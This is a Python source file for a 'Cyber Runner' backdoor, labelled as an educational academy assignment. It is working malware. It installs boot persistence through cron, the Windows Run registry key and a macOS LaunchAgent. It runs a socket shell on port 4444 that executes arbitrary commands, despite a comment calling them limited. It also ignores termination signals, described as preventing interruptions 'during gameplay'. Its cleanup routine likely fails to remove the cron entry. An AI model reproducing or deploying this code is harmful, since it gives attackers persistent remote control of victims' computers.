#!/usr/bin/env python3
"""
Backdoor Utilities - Educational Cybersecurity Tool
For educational purposes only - Rwanda Coding Academy Assignment
"""

import os
import sys
import socket
import threading
import subprocess
import platform
import time
import json
import shutil
import requests
from pathlib import Path

class BackdoorManager:
    def __init__(self):
        self.system = platform.system()
        self.home_dir = Path.home()
        self.config_dir = self.home_dir / ".cyber_runner"
        self.config_file = self.config_dir / "config.json"
        self.server_ip = "127.0.0.1"  # Local server for demo
        self.server_port = 4444
        self.listener_socket = None
        self.client_socket = None
        
        # Required dependencies
        self.required_apps = {
            'curl': 'curl',
            'wget': 'wget',
            'python3': 'python3',
            'pip': 'pip3'
        }
        
    def log_activity(self, message):
        """Log backdoor activities for educational purposes"""
        log_file = self.config_dir / "activity.log"
        log_file.parent.mkdir(exist_ok=True)
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
            
    def check_dependencies(self):
        """Check if required applications are installed"""
        missing_apps = []
        
        for app, command in self.required_apps.items():
            try:
                subprocess.run([command, '--version'], 
                             capture_output=True, check=True, timeout=5)
                self.log_activity(f"Dependency check: {app} found")
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                missing_apps.append(app)
                self.log_activity(f"Dependency check: {app} missing")
                
        return missing_apps
        
    def download_from_local_server(self, app_name):
        """Download missing applications from local server"""
        try:
            # Simulate local server download
            url = f"http://{self.server_ip}:8000/packages/{app_name}"
            
            # For demo purposes, we'll just simulate the download
            self.log_activity(f"Attempting to download {app_name} from {url}")
            
            # In a real scenario, this would download and install
            # For educational demo, we'll just log the attempt
            return True
            
        except Exception as e:
            self.log_activity(f"Failed to download {app_name}: {str(e)}")
            return False
            
    def install_dependencies(self):
        """Install missing dependencies"""
        missing = self.check_dependencies()
        
        for app in missing:
            self.log_activity(f"Installing {app}...")
            if self.download_from_local_server(app):
                self.log_activity(f"Successfully installed {app}")
            else:
                self.log_activity(f"Failed to install {app}")
                
    def create_persistence(self):
        """Create persistence mechanism"""
        try:
            if self.system == "Linux":
                self._create_linux_persistence()
            elif self.system == "Windows":
                self._create_windows_persistence()
            elif self.system == "Darwin":  # macOS
                self._create_macos_persistence()
                
            self.log_activity("Persistence mechanism created")
            return True
            
        except Exception as e:
            self.log_activity(f"Failed to create persistence: {str(e)}")
            return False
            
    def _create_linux_persistence(self):
        """Create Linux persistence using cron"""
        script_path = os.path.abspath(__file__)
        
        # Add to user's crontab
        cron_job = f"@reboot python3 {script_path} --silent\n"
        
        try:
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout
            
            # Check if already exists
            if script_path not in current_cron:
                # Append new job
                new_cron = current_cron + cron_job
                
                # Write new crontab
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                process.communicate(input=new_cron.encode())
                
        except subprocess.CalledProcessError:
            # No existing crontab, create new one
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            process.communicate(input=cron_job.encode())
            
    def _create_windows_persistence(self):
        """Create Windows persistence using registry"""
        import winreg
        
        script_path = os.path.abspath(__file__)
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "CyberRunner", 0, winreg.REG_SZ, 
                            f"pythonw.exe {script_path}")
            winreg.CloseKey(key)
        except Exception as e:
            self.log_activity(f"Windows persistence failed: {str(e)}")
            
    def _create_macos_persistence(self):
        """Create macOS persistence using launch agent"""
        script_path = os.path.abspath(__file__)
        launch_agent_dir = self.home_dir / "Library" / "LaunchAgents"
        launch_agent_dir.mkdir(exist_ok=True)
        
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.cyberrunner.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{script_path}</string>
        <string>--silent</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
        
        plist_file = launch_agent_dir / "com.cyberrunner.agent.plist"
        with open(plist_file, 'w') as f:
            f.write(plist_content)
            
    def start_shell_listener(self):
        """Start shell access listener"""
        def listener():
            try:
                self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.listener_socket.bind((self.server_ip, self.server_port))
                self.listener_socket.listen(1)
                
                self.log_activity(f"Shell listener started on {self.server_ip}:{self.server_port}")
                
                while True:
                    try:
                        client_socket, addr = self.listener_socket.accept()
                        self.log_activity(f"Connection from {addr}")
                        
                        # Handle shell session
                        self.handle_shell_session(client_socket)
                        
                    except Exception as e:
                        self.log_activity(f"Listener error: {str(e)}")
                        break
                        
            except Exception as e:
                self.log_activity(f"Failed to start listener: {str(e)}")
                
        listener_thread = threading.Thread(target=listener, daemon=True)
        listener_thread.start()
        
    def handle_shell_session(self, client_socket):
        """Handle individual shell session"""
        try:
            # Send welcome message
            welcome = "Cyber Runner Educational Shell\n"
            welcome += "Type 'help' for commands or 'exit' to disconnect\n"
            welcome += "$ "
            client_socket.send(welcome.encode())
            
            while True:
                # Receive command
                data = client_socket.recv(1024).decode().strip()
                
                if data.lower() == 'exit':
                    client_socket.send(b"Goodbye!\n")
                    break
                    
                if data.lower() == 'help':
                    help_text = """Available commands:
  help     - Show this help
  info     - Show system information
  status   - Show backdoor status
  exit     - Disconnect
"""
                    client_socket.send(help_text.encode())
                    client_socket.send(b"$ ")
                    continue
                    
                if data.lower() == 'info':
                    info = f"""System Information:
  OS: {self.system}
  Hostname: {socket.gethostname()}
  User: {os.getenv('USER', 'Unknown')}
  Python: {sys.version}
"""
                    client_socket.send(info.encode())
                    client_socket.send(b"$ ")
                    continue
                    
                if data.lower() == 'status':
                    status = f"""Backdoor Status:
  Listener: {'Active' if self.listener_socket else 'Inactive'}
  Port: {self.server_port}
  Persistence: {'Active' if self.config_file.exists() else 'Inactive'}
"""
                    client_socket.send(status.encode())
                    client_socket.send(b"$ ")
                    continue
                    
                # Execute command safely (limited commands for demo)
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, 
                                          text=True, timeout=10)
                    output = result.stdout + result.stderr
                    client_socket.send(output.encode())
                except subprocess.TimeoutExpired:
                    client_socket.send(b"Command timeout\n")
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}\n".encode())
                    
                client_socket.send(b"$ ")
                
        except Exception as e:
            self.log_activity(f"Shell session error: {str(e)}")
        finally:
            client_socket.close()
            
    def prevent_interruptions(self):
        """Prevent interruptions during gameplay"""
        try:
            if self.system == "Linux":
                # Disable common interrupt signals
                import signal
                signal.signal(signal.SIGINT, signal.SIG_IGN)
                signal.signal(signal.SIGTERM, signal.SIG_IGN)
                
            self.log_activity("Interruption prevention activated")
            
        except Exception as e:
            self.log_activity(f"Failed to prevent interruptions: {str(e)}")
            
    def save_config(self):
        """Save configuration"""
        config = {
            'server_ip': self.server_ip,
            'server_port': self.server_port,
            'installed_time': time.time(),
            'system': self.system
        }
        
        self.config_dir.mkdir(exist_ok=True)
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)
            
        self.log_activity("Configuration saved")
        
    def initialize(self):
        """Initialize all backdoor components"""
        self.log_activity("Initializing Cyber Runner backdoor...")
        
        # Install dependencies
        self.install_dependencies()
        
        # Create persistence
        self.create_persistence()
        
        # Start shell listener
        self.start_shell_listener()
        
        # Prevent interruptions
        self.prevent_interruptions()
        
        # Save configuration
        self.save_config()
        
        self.log_activity("Backdoor initialization complete")
        
    def cleanup(self):
        """Cleanup function for educational removal"""
        try:
            self.log_activity("Starting cleanup...")
            
            if self.system == "Linux":
                # Remove from crontab
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                new_lines = [line for line in lines if 'cyber_runner' not in line]
                
                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
                process.communicate(input='\n'.join(new_lines).encode())
                
            # Remove config directory
            if self.config_dir.exists():
                shutil.rmtree(self.config_dir)
                
            self.log_activity("Cleanup complete")
            
        except Exception as e:
            self.log_activity(f"Cleanup failed: {str(e)}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Cyber Runner Backdoor Manager')
    parser.add_argument('--silent', action='store_true', help='Run silently')
    parser.add_argument('--cleanup', action='store_true', help='Cleanup backdoor')
    
    args = parser.parse_args()
    
    backdoor = BackdoorManager()
    
    if args.cleanup:
        backdoor.cleanup()
    else:
        backdoor.initialize()
        
    if not args.silent:
        print("Cyber Runner Backdoor Manager")
        print("Educational tool for cybersecurity training")
        print(f"Listener: {backdoor.server_ip}:{backdoor.server_port}")
